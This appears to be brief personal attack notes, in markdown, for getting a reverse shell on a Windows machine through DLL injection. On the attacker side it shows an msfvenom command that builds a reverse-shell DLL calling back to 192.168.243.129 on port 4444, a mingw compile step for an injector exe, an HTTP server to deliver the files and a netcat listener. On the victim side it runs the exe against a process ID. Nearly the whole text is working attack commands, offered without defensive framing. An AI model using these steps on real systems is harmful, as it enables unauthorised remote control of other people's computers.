# Attacker server
- Create malicious dll with msfvenom
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.243.129 LPORT=4444 -f dll -o shell.dll
```
- Create a C++ file to complile exe (shell.cpp)
- Compile exe file from C++ file:
```bash
x86_64-w64-mingw32-g++ -o shell.exe shell.cpp -static-libgcc -static-libstdc++
```
- Run listening server
```bash
python -m http.server 80
nc -nvlp 4444
```

# Victime machine
```bash
.\shell.exe PID_of_injected_process
```